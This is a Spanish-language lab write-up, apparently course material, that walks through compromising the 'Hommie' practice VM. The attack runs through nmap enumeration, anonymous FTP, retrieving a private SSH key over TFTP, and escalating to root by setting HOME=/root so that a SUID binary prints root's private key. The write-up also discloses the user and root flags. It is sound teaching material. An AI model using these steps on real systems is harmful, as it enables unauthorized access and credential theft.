---
title: "🖥️ Máquina: Hommie — Hacking Ético"
aliases:
  - Hommie
  - Máquina Hommie
  - VM Hommie
  - Writeup Hommie
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Hommie

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** FTP anónimo · Enumeración UDP · TFTP · Acceso SSH con clave privada · Escalada de privilegios (SUID + manipulación de variable de entorno)  
> **Descripción:** En esta práctica exploraremos un servidor Linux que expone una clave privada SSH a través de un servicio TFTP. Accederemos al sistema con esa clave y escalaremos privilegios abusando de un binario SUID que lee una ruta construida a partir de una variable de entorno que podemos manipular.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Hommie):** Ej. `10.0.0.14`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Hommie tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Es buena práctica exportar la IP de la víctima como variable de entorno para no tener que escribirla en cada comando:

```bash
export rhost=10.0.0.14
```

Lanzamos el escaneo completo de puertos TCP:

```bash
nmap -sT -p- $rhost
```

> [!info] Resultado
> El escaneo revela tres puertos abiertos:
> · 21/tcp — FTP
> · 22/tcp — SSH
> · 80/tcp — HTTP

Realizamos un escaneo detallado sobre los puertos descubiertos:

```bash
nmap -v -A -p21,22,80 $rhost
```

> [!info] Resultado
> · El FTP corre vsftpd 3.0.3 con login anónimo habilitado. Además hay un archivo index.html visible en el directorio raíz del FTP.
> · El SSH corre OpenSSH 7.9p1.
> · El HTTP corre nginx 1.14.2 sin título en la página.

---

## 🌐 Fase 2: Enumeración web y FTP

Inspeccionamos el contenido de la página web:

```bash
curl http://$rhost
```

> [!info] Resultado
> La página muestra el siguiente mensaje:
> alexia, Your id_rsa is exposed, please move it!!!!!
> Im fighting regarding reverse shells!
> -nobody
> Obtenemos información muy valiosa: existe un usuario llamado alexia y su clave privada SSH (id_rsa) está expuesta en algún lugar del servidor. El mensaje está firmado por nobody, lo que sugiere que es una nota interna.

Accedemos al FTP como usuario anónimo para investigar:

```bash
ftp $rhost
```

```bash
Name: anonymous
```

```bash
ftp> ls -la
```

> [!info] Resultado
> Encontramos un directorio oculto llamado .web. Entramos y listamos su contenido:

```bash
ftp> cd .web
```

```bash
ftp> ls -la
```

```bash
ftp> get index.html
```

> [!info] Resultado
> El archivo index.html descargado contiene el mismo mensaje que vimos en la web. Esto confirma que el directorio .web del FTP es la raíz del servidor web nginx. Sin embargo, la clave id_rsa no está aquí. Necesitamos buscar por otros servicios.

---

## 📡 Fase 3: Enumeración UDP y TFTP

Hasta ahora solo hemos escaneado puertos TCP. El mensaje hablaba de una clave expuesta que no hemos encontrado, así que ampliamos la búsqueda a puertos UDP. El escaneo UDP es más lento, por lo que usamos --top-ports 100 para limitar la búsqueda a los 100 puertos UDP más comunes:

```bash
sudo nmap -sU --top-ports 100 $rhost
```

> [!info] Resultado
> Encontramos dos puertos UDP relevantes:
> · 68/udp — DHCP client
> · 69/udp — TFTP
> TFTP (Trivial File Transfer Protocol) es una versión muy simplificada de FTP que opera sobre UDP. Su característica más importante desde el punto de vista de seguridad es que no requiere autenticación: cualquiera puede solicitar un archivo si conoce su nombre. Dado que el mensaje de la web mencionaba que la id_rsa de alexia estaba expuesta, es muy probable que esté accesible a través de este servicio.

Nos conectamos al servidor TFTP y solicitamos la clave privada:

```bash
tftp $rhost 69
```

```bash
tftp> get id_rsa
```

> [!info] Resultado
> Descargamos correctamente el archivo id_rsa, que contiene la clave privada SSH de alexia. Tenemos todo lo necesario para acceder al sistema: usuario y clave privada.

---

## 🔑 Fase 4: Acceso SSH con clave privada

Las claves privadas SSH deben tener permisos restrictivos. Si los permisos son demasiado abiertos, el cliente SSH rechazará usarla por razones de seguridad. Siempre hay que asignar permisos 600 (solo lectura/escritura para el propietario):

```bash
chmod 600 id_rsa
```

Accedemos al sistema usando la clave privada con el parámetro -i:

```bash
ssh -i id_rsa alexia@10.0.0.14
```

> [!info] Resultado
> Acceso exitoso como alexia. Verificamos la identidad y leemos la flag del usuario:

```bash
id; whoami
```

```bash
cat user.txt
```

> [!info] Resultado
> Flag de usuario: Imnotroot

---

## 🚀 Fase 5: Escalada de privilegios

Comprobamos si el usuario puede ejecutar comandos como root:

```bash
sudo -l
```

> [!info] Resultado
> El comando sudo no está disponible en este sistema. Buscamos otra vía.

Buscamos binarios con el bit SUID activo:

```bash
find / -perm -u=s 2>/dev/null
```

> [!info] Resultado
> Encontramos un binario no estándar: /opt/showMetheKey. Al ejecutarlo vemos que muestra la clave privada SSH del usuario actual. Tiene el bit SUID activo con propietario root, lo que significa que se ejecuta con privilegios de root aunque lo lance un usuario sin privilegios.

Antes de intentar abusar de él, usamos strings para inspeccionar las cadenas de texto legibles dentro del binario. Esto nos permite ver qué comandos o rutas utiliza internamente sin necesidad de desensamblarlo:

```bash
strings /opt/showMetheKey
```

> [!info] Resultado
> Entre las cadenas encontramos la línea clave:
> cat $HOME/.ssh/id_rsa
> Esto revela el comportamiento exacto del binario: ejecuta cat sobre la ruta $HOME/.ssh/id_rsa, donde $HOME es una variable de entorno. El problema de seguridad aquí es crítico: el binario se ejecuta con privilegios de root (SUID), pero construye la ruta del archivo usando una variable de entorno que el usuario puede modificar libremente. Si cambiamos el valor de $HOME a /root, el binario leerá /root/.ssh/id_rsa, es decir, la clave privada de root.

Comprobamos el valor actual de HOME:

```bash
env | grep HOME
```

> [!info] Resultado
> HOME=/home/alexia — valor normal para nuestro usuario.

Modificamos la variable para apuntar al directorio de root:

```bash
export HOME=/root
```

Ejecutamos de nuevo el binario. Ahora leerá /root/.ssh/id_rsa en lugar de la nuestra:

```bash
/opt/showMetheKey
```

> [!info] Resultado
> El binario muestra la clave privada SSH de root. Redirigimos la salida a un archivo para guardarla:

```bash
/opt/showMetheKey > id_rsa_root
```

Restauramos la variable HOME a su valor original para no romper el entorno de trabajo:

```bash
export HOME=/home/alexia
```

Asignamos los permisos correctos a la clave de root:

```bash
chmod 600 id_rsa_root
```

Usamos la clave de root para conectarnos como root por SSH en local (127.0.0.1):

```bash
ssh -i id_rsa_root root@127.0.0.1
```

> [!info] Resultado
> Acceso exitoso como root. En el directorio home de root encontramos una nota:

```bash
cat note.txt
```

> [!info] Resultado
> I dont remember where I stored root.txt !!!
> La flag no está en el directorio habitual. Necesitamos buscarla en todo el sistema:

```bash
find / -name root.txt 2>/dev/null
```

> [!info] Resultado
> La flag se encuentra en una ruta inusual: /usr/include/root.txt. Este directorio normalmente contiene cabeceras de desarrollo en C, no flags, lo que hace que sea fácil pasarla por alto.

```bash
cat /usr/include/root.txt
```

> [!info] Resultado
> Flag de root: Imnotbatman

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
